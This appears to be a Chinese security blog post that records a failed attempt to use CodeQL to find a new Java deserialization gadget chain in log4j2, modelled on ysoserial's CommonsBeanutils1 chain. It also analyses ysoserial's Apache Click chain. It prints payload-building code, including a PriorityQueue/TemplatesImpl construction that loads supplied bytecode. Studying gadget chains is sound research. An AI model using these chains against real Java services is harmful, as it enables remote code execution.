## 记一次Log4j失败的Gadget挖掘记录



### 前言

&emsp;&emsp; 最开始我在《CodeQL与Shiro550的碰撞》的文章中提出了基于p牛写的依赖shiro1.2.4原生依赖CommonsBeanutils的漏洞gadget挖掘出了更多版本的漏洞gadget。之后我在使用CodeQL研究JNDI的漏洞触发类的挖掘办法，某天晚上玩着手机就突然想到如果我将这个方法用到挖掘漏洞gadget上呢？会有什么效果呢？虽然是一次失败的经历，但让笔者我对挖掘漏洞Gadget有了进一步深刻的理解。



----

### CommonsBeanutils

&emsp;&emsp; 本文尝试都是基于CommonsBeanutils的gadget的基础之上去挖掘新的gadget（对这个gadget非常熟悉的原因。）

首先对CommonsBeanutils1的gadget的进行分析，主要找出那些是可以变动的，那些是不变的点。这段代码是ysoserial中的CommonsBeanutils一个gadget。

```java
public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		final BeanComparator comparator = new BeanComparator("lowestSetBit");
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));
	    Reflections.setFieldValue(comparator, "property", "outputProperties");
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;
		return queue;
	}
```



----



#### 逐行代码分析

这行代码是生成Templates命令的

```java
final Object templates = Gadgets.createTemplatesImpl(command);
```

BeanComparator是CommonsBeanutils1的chain的漏洞触发点，也可以是直接**new BeanComparator();** 。P牛提出的基于jdk内置的CommonsBeanutils的gadget chain写法是 **new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);** ，BeanComparator是支持传入Comparator，如果不写就默认调用commons collection中的**ComparableComparator**。这里comparator在整个的gadget chain中是没有任何的调用，所以才能被随意的替换成其他的comparator。

```java
final BeanComparator comparator = new BeanComparator("lowestSetBit");
```

![image-20211102170436950](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//44u04er44ec/44u04er44ec.png)

PrioritiyQueue是一个优先队列，配合TemplatesImpl的组合反序列化漏洞chain。为了比较优先级，PrioritiyQueue除了使用内置的comparator之外也是支持传入comparator。queue.add()随意添加两个变量是为了序列化做到兼容，反序列化的时候queue队列中的对象就是恶意TemplatesImpl对象。

```java
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
queue.add(new BigInteger("1")); // queue.add("1"); 
queue.add(new BigInteger("1")); // queue.add("1"); 
```

通过反射方式修改comparator的字段`proerty`的值为`outputProperties`， 这个点是TemplatesImpl漏洞触发的必要条件。

```java
Reflections.setFieldValue(comparator, "property", "outputProperties");
final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
queueArray[0] = templates;
queueArray[1] = templates;
return queue;
```



----

### Gadget 构造条件

分析gadget的构造条件和构造过程，能够帮助更好从挖掘者的角度分析体会如何去挖掘一个全新的gadget。但如果从0开始构造个全新的漏洞利用方式对于目前的我来说很难。但从局部替换的方式出发，寻找**可变量**与**永恒量**分析每一行的深层含义，这将大大减低一个漏洞gadget挖掘难度。



  #### CommonsBeanutils构造条件

CommonsBeanutils使用的是PriorityQueue与TemplatesImpl组合的方式，前面提到PriorityQueue是支持传入Comparator。PriorityQueue组合特点就是在调用**siftDownUsingComparator**方法时会跳到BeanComparator中的Compare方法，在Comparator方法中获取到前面通过反射修改的property的值**outputProperties**。这个时触发TemplatesImpl中的**getOutputProperties**的调用，最终在**getTransletInstance**进行一个强制的类型转化触发漏洞。

```
final BeanComparator comparator = new BeanComparator("lowestSetBit");
```

触发TemplatesImpl中的**getOutputProperties**的调用

![image-20211103110157384](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//4u02er4ec/4u02er4ec.png)

**getTransletInstance**进行一个强制的类型转化触发漏洞

![image-20211103110248123](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//48u02er48ec/48u02er48ec.png)





#### 总结

CommonsBeanutils这个gadget chain核心可以分为BeanComparator和PriorityQueue两个部分，两个部分有三种组合方式，本次挖掘将BeanComparator定义为了**可变量**，PriorityQueue定义为了**永恒量**。（也是最简单的一种组合方式）



---

### apache log4j2 -- 日志组件



#### 可变量 -- BeanComparator 

分析一下BeanComparator在本次gadget做了那些事情，首先作为Comparator传入PriorityQueue中。那来看一下作为PriorityQueue的Comparator有那些要求，首先毋庸置疑得实现Serializable接口。然后作为一个comparator也得实现Java.util.Comparator接口。

![image-20211103143011606](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//11u30er11ec/11u30er11ec.png)



其次得实现compare方法

![image-20211103143454090](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//20u39er20ec/20u39er20ec.png)



---

#### log4j2 -- PropertySource

这里使用CodeQL去挖掘log4j2组件时的QL规则，最终找到三个类。

```codeql
import java

class MySerializableImpl extends ClassOrInterface{
	MySerializableImpl(){
		this.getName()="Comparator"
  }
}

predicate isMyClass( Class m){
	m.getASourceSupertype() instanceof MySerializableImpl
	and m.getASourceSupertype() instanceof TypeSerializable
}

from Class c
where isMyClass(c)
select c
```

![image-20211103151036584](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//36u10er36ec/36u10er36ec.png)



看源码发现，笔者发现PropertySource接口更贴近于所需要的类。下面这段代码是笔者当时构造的一个漏洞gadget chain，很遗憾的是失败了的。

```java
public class PropertySources {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public void getPayload(byte[] clazzBytes) throws Exception {
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        Properties properties = new Properties();
        org.apache.logging.log4j.util.PropertiesPropertySource propertySource1 = new org.apache.logging.log4j.util.PropertiesPropertySource(properties);
        org.apache.logging.log4j.util.PropertySource propertySource2 = new org.apache.logging.log4j.util.PropertySource() {
            @Override
            public int getPriority() {
                return 0;
            }
        };
        Comparator comparator =  new org.apache.logging.log4j.util.PropertySource.Comparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(propertySource2);
        queue.add(propertySource2);
        setFieldValue(propertySource1, "properties", properties);
//        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});
    }
}
```



#### 失败原因分析

comparator实现compare方法达不到需求，方法的参数类型限制死了只能为PropertySource类。在BeanComparator类中compare方法是一个泛型T，这些需要将TemplatesImpl传入进去，然后得调用getProperty方法获取**outputProperties**值。这里comparator有getProperty方法，但这个方法返回值是int类型，而不是String类型因此无法获取到outputProperties的值进而无法触发反序列化漏洞。

![image-20211103153535785](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//35u35er35ec/35u35er35ec.png)



---

###  apache click 

在挖掘失败之后笔者尝试去ysoserial源码里面验证自己想法，发现在2021年年初的时候作者合并了一个pr里面就完美验证了想法。这里做个简单验证分析流程。

1. comparator首先实现了java.util.Comparator和Serializable接口
2. compare方法参数是Object类型，所以的类的父类都是Object类所以也能满足需求
3. 在compare方法里面有getProperty方法

```java
static class ColumnComparator implements Comparator, Serializable {
    private static final long serialVersionUID = 1L;
    protected int ascendingSort;
    protected final Column column;

    public ColumnComparator(Column column) {
        this.column = column;
    }

    public int compare(Object row1, Object row2) {
        this.ascendingSort = this.column.getTable().isSortedAscending() ? 1 : -1;
        Object value1 = this.column.getProperty(row1);
        Object value2 = this.column.getProperty(row2);
        if (value1 instanceof Comparable && value2 instanceof Comparable) {
            return !(value1 instanceof String) && !(value2 instanceof String) ? ((Comparable)value1).compareTo(value2) * this.ascendingSort : this.stringCompare(value1, value2) * this.ascendingSort;
        } else if (value1 != null && value2 != null) {
            return value1.toString().compareToIgnoreCase(value2.toString()) * this.ascendingSort;
        } else if (value1 != null && value2 == null) {
            return 1 * this.ascendingSort;
        } else {
            return value1 == null && value2 != null ? -1 * this.ascendingSort : 0;
        }
    }
```

在compare方法里面有getProperty方法，这点想张开讲讲。在click的gadget chain中有一个setName操作，这里操作在反序列化的时候调用getName方法的时候会返回**outputProperties**.

```Java
column.setName("outputProperties");
```

进而在调用getProperty方法的调用PropertyUtils触发反序列化漏洞。

![image-20211103161221805](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//21u12er21ec/21u12er21ec.png)

----

#### click tips

ysoserial里面获取Comparator是通过反射的方式，但其实在Colunm中是提供了getComparator方法，故其实不需要反射调用，直接调用即可。

```
Comparator comparator = (Comparator) Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", column);
Comparator comparator = column.getComparator();
```

![image-20211103162237208](https://raw.githubusercontent.com/SummerSec/Images/main/summersec//37u22er37ec/37u22er37ec.png)







### 总结

&emsp;&emsp; 一个完美的漏洞gadget chain的每一步都是必不可少，具体到每一个细节。第一次尝试挖掘漏洞gadget chain虽然失败了，但是学到了很多知识点，对挖掘gadget chain积累一点小tips吧。目前个人想法，如果要对去挖掘一个全新的漏洞gadget chain，这难度不亚于唐僧取经。这也使得笔者对每一个gadget chain有更多敬意。。。本文只是个人探索gadget chain的一次小尝试记录文，如果有错误，还请斧正。

----



### 参考

https://lgtm.com/query/5500894352545410828/
